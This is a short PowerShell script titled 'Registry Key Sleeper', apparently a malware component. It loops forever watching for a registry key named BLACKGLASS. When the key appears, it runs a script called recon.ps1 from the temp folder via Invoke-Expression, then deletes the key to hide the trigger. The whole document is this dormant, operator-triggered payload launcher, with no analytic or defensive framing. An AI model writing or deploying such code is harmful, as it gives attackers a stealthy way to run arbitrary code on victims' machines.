# Registry Key Sleeper - Monitors key presence to trigger payload
$key = "HKCU:\Software\BLACKGLASS"
while ($true) {
  if (Test-Path $key) {
    Invoke-Expression (Get-Content "$env:TEMP\recon.ps1" -Raw)
    Remove-Item $key -Force
  }
  Start-Sleep -Seconds 5
}
